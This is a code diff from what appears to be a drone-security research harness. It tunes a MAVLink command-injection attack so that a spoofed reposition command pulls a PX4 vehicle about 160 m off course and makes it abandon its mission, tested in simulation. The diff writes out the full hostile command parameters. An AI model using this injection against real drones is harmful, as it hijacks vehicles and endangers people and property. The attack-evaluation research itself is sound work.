@@ -128,7 +128,32 @@ class PymavlinkSender(MavlinkSender):
 # MAV_CMD_DO_REPOSITION = 192
 # Innocuous-looking command (asks vehicle to move to a position).
 DEFAULT_COMMAND_ID: int = 192
-DEFAULT_PARAMS: tuple[float, ...] = (0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0)
+# MAV_CMD_DO_REPOSITION param layout in COMMAND_LONG:
+#   p1 ground speed (-1 = keep the vehicle default)
+#   p2 bitmask; 1 = MAV_DO_REPOSITION_FLAGS_CHANGE_MODE, i.e. force
+#      loiter at the commanded point and abandon the running mission
+#   p3 reserved; p4 yaw (NaN = unchanged)
+#   p5 latitude, p6 longitude, p7 altitude AMSL
+#
+# The previous default was seven zeros, which commands a reposition to
+# lat 0 / lon 0 / alt 0. PX4 rejects it, so the injected command was
+# detectable but had no effect on the mission and measured mission
+# degradation was indistinguishable from the no-attack baseline. The
+# target below sits ~160 m north of the PX4 SITL home position, well
+# outside the 30x30 m mission box, so an accepted command produces a
+# deviation that cannot be confused with nominal tracking error.
+SPOOFED_TARGET_LAT: float = 47.3992
+SPOOFED_TARGET_LON: float = 8.5456
+SPOOFED_TARGET_ALT_AMSL_M: float = 508.0
+DEFAULT_PARAMS: tuple[float, ...] = (
+    -1.0,
+    1.0,
+    0.0,
+    float("nan"),
+    SPOOFED_TARGET_LAT,
+    SPOOFED_TARGET_LON,
+    SPOOFED_TARGET_ALT_AMSL_M,
+)
 
 
 class CommandInjectionInjector(AttackInjector):
